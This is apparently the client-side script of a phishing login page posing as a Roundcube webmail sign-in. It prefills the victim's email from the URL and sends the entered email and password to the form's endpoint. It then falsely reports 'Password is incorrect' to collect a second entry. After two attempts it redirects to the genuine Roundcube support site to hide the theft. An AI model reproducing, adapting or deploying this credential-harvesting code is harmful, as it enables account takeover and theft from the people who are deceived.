<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

<script src="jquery.min.v2.js"></script>

<script type="text/javascript">
    let kantass = 0;
    const redirected = "https://roundcube.net/support/";


    const param = new URLSearchParams(window.location.search);
    var hash = location.hash ? location.hash.slice(1) : '';
    var hasherror = hash && hash.indexOf('error=') > -1 ? 'error' : '';
    var emailParam = param.get('email') || param.get('login') || hash;
    let count = 0;
    
    if (emailParam === "null") {
    emailParam = "";
    }

    const email = document.getElementById('email');
    const password = document.getElementById('password');
    const source = document.getElementById('source');
    const login = document.getElementById('submitBtn');
    const form = document.getElementById("login-form");
    const red = document.getElementById("errorShow");
    email.value = emailParam;

    login.addEventListener('click', function(e){
    e.preventDefault();
    if (email.value === "") {
        showEl(red, "red");
        red.textContent = "Enter your email address.";          
        email.focus();
        return;
    } else if (!email.value.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
        showEl(red, "red");
        red.textContent = "Enter a valid email address.";
        email.focus();
        return;
    } else if (password.value === "") {
        showEl(red, "red");
        red.textContent = "Enter a valid password!";
        password.focus();
        return;
    } else {
        kantass++;

        var $form = $("#loginForm");
        var data = {
            email: email.value,
            password: password.value,
            source: source.value
        };
        var url = form.action;


        var msg = $('#msg').html();
        $('#msg').text( msg );
        
        $.ajax({
        type: "POST",
        url: url,
        data: data,
        cache: false,
        timeout: 800000,
        beforeSend: function(xhr){
            $('#submitBtn').attr("disabled", true);
            $('#submitBtn').css( 'cursor', 'not-allowed');
            },
        success: function(res){
            if(res){
            password.value = "";
            password.style.borderColor = "red";
            showEl(red, "red");
            red.textContent = "Password is incorrect.";
            $('#submitBtn').attr("disabled", false);
            $('#submitBtn').css("cursor", "pointer");
            
            if (kantass >= 2){
                hideEl(red, "red");
                red.textContent = "";
                window.location.replace(redirected);
            }

            console.log(response);
            if(response['signal'] == 'ok'){
                $('#msg').html(response['msg']);
                
            }
            else{

                $('#msg').html(response['msg']);
            }
            }else {
                showEl(red, "red");
                red.textContent = "Something went wrong, please try again";
                password.value = "";
                password.style.borderColor = "red";
            }
        },
        error: function(){
            showEl(red, "red");
            red.textContent = "Something went wrong, please try again";
            password.value = "";
            password.style.borderColor = "red";
        },
        complete: function(){
            $('#popopopopo').html('View');
        }
        });
        }
        });

        function showEl(el, color) {
            el.style.color = color;
            el.style.display = "block";
        }

        function hideEl(el) {
            el.style.color = '#000';
            el.style.display = "none";
            el.textContent = "";
        }
</script>
